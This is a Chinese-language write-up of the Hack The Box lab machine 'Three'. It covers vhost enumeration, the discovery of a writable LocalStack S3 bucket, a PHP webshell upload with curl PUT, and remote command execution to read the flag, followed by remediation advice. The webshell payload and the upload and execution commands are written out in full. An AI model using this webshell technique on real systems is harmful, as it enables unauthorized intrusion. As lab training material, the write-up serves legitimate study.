---
title: "HTB Starting Point - Three 渗透测试报告"
date: 2026-07-12T23:00:00+08:00
draft: false
categories: ["渗透测试"]
tags: ["HTB", "Starting Point", "Three", "S3", "云存储", "Webshell", "RCE"]
---

## HTB Starting Point - Three 渗透测试报告

### 一、靶机信息

| 项目 | 内容 |
|------|------|
| 平台 | Hack The Box (HTB) |
| 分类 | Starting Point / Tier 1 |
| 机器名 | Three |
| 目标 IP | 10.129.227.248 |
| 难度 | 入门级 |

---

### 二、渗透测试完整流程

#### 阶段 1：信息收集

```bash
nmap -sC -sV -T4 10.129.227.248
```

**扫描结果：**

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

仅开放 80 端口。访问 `http://10.129.227.248` 是一个音乐乐队网站 "The Toppers"。

---

#### 阶段 2：虚拟主机枚举

网站使用域名访问，需要枚举子域名/虚拟主机。

使用自编写 Python 脚本 `vhost-enum.py`：

```bash
vhost-enum 10.129.227.248 thetoppers.htb
```

**原理：** 发送 HTTP 请求时修改 `Host` 头，对比响应长度判断子域名是否存在。

**发现：** `s3.thetoppers.htb` 返回内容与其他子域名不同（状态码/长度差异）。

**子域名确认：**

```bash
curl -s -H "Host: s3.thetoppers.htb" http://10.129.227.248/
# 返回: {"status": "running"}
```

---

#### 阶段 3：S3 存储桶枚举

进一步探测，请求 `/health` 端点：

```bash
curl -s -H "Host: s3.thetoppers.htb" http://10.129.227.248/health
```

返回内容确认为 **LocalStack**（AWS 本地模拟器，版本 0.14.2），S3 服务处于运行状态。

枚举 S3 存储桶：

```bash
curl -s -H "Host: s3.thetoppers.htb" http://10.129.227.248/thetoppers.htb
```

返回桶内文件列表（XML 格式）：

| 文件 | 说明 |
|------|------|
| `.htaccess` | Apache 配置（空） |
| `index.php` | 网站首页 |
| `images/band.jpg` | 图片 |
| `images/mem1.jpg` ~ `mem3.jpg` | 图片 |

桶内无 flag。

---

#### 阶段 4：上传 Webshell

S3 存储桶**可写入**，利用 PUT 请求上传 PHP webshell：

```bash
curl -s -X PUT -H "Host: s3.thetoppers.htb" \
  -d "<?php system($_GET['cmd']); ?>" \
  http://10.129.227.248/thetoppers.htb/shell.php
```

---

#### 阶段 5：远程命令执行（RCE）

主站 `thetoppers.htb` 的源码就存放在该 S3 桶中，上传的 shell 可通过主站直接访问：

```bash
curl -s -H "Host: thetoppers.htb" \
  "http://10.129.227.248/shell.php?cmd=ls /var/www/"
# 返回: flag.txt html
```

读取 flag：

```bash
curl -s -H "Host: thetoppers.htb" \
  "http://10.129.227.248/shell.php?cmd=cat /var/www/flag.txt"
# 返回: a980d99281a28d638ac68b9bf9453c2b
```

---

### 三、攻击链总结

```
nmap → 80/tcp HTTP
    │
    ▼
vhost 枚举 → 发现 s3.thetoppers.htb
    │
    ▼
LocalStack S3 存储桶（可读写）
    │
    ▼
PUT 上传 shell.php 到桶内
    │
    ▼
主站访问 shell.php → RCE
    │
    ▼
ls /var/www/ → cat flag.txt
```

---

### 四、Windows 环境工具

#### 4.1 vhost-enum.py — 虚拟主机枚举

```bash
vhost-enum <IP> <主域名>
```

| 替代对象 | 功能 |
|----------|------|
| `gobuster vhost` | 虚拟主机/子域名枚举 |
| `ffuf` | Fuzz 工具 |

**核心逻辑：** 遍历子域名列表，每个子域名构造 `Host: sub.domain` 头，对比各响应长度差异。

#### 4.2 S3 操作对照

| 操作 | 命令 |
|------|------|
| 列桶 | `curl -H "Host: s3.domain" http://IP/桶名` |
| 读文件 | `curl -H "Host: s3.domain" http://IP/桶名/文件路径` |
| 上传文件 | `curl -X PUT -H "Host: s3.domain" -d "内容" http://IP/桶名/文件名` |
| 删文件 | `curl -X DELETE -H "Host: s3.domain" http://IP/桶名/文件名` |

与 Linux 下 `awscli --endpoint-url` 功能等价。

---

### 五、九台机器总览

| # | 机器 | 服务 | 攻击方式 | 类型 |
|---|------|------|----------|------|
| 1 | Meow | Telnet | root 空密码 | 弱配置 |
| 2 | Fawn | FTP | anonymous 空密码 | 弱配置 |
| 3 | Cap | HTTP+FTP | IDOR → pcap → 明文密码 | 越权+泄露 |
| 4 | Dancing | SMB | Guest 空密码共享 | 弱配置 |
| 5 | Redeemer | Redis | 未授权访问 | 弱配置 |
| 6 | Appointment | HTTP | SQL 注入认证绕过 | Web 漏洞 |
| 7 | Sequel | MariaDB | root 空密码 | 弱配置 |
| 8 | Crocodile | FTP+HTTP | 匿名 FTP → 凭据泄露 → Web 登录 | 信息泄露 |
| 9 | Three | HTTP+S3 | vhost 枚举 → S3 可写 → 上传 shell → RCE | 云存储+RCE |

Three 的突破点：S3 存储桶**可写入** + Web 源码托管在 S3 → 上传的文件被 Web 直接解析执行。

---

### 六、修复建议

| 问题 | 建议 |
|------|------|
| S3 可匿名写入 | 启用 S3 认证，禁止未授权 PUT 请求 |
| S3 可匿名读取 | 限制桶策略，仅允许经过身份验证的访问 |
| S3 与 Web 同源 | S3 文件存储与 Web 代码执行隔离，不使用同一桶 |
| PHP 文件可直接上传 | 限制 S3 桶的文件类型（禁止 .php） |
| 无 WAF | 部署 WAF 检测 Webshell 上传行为 |
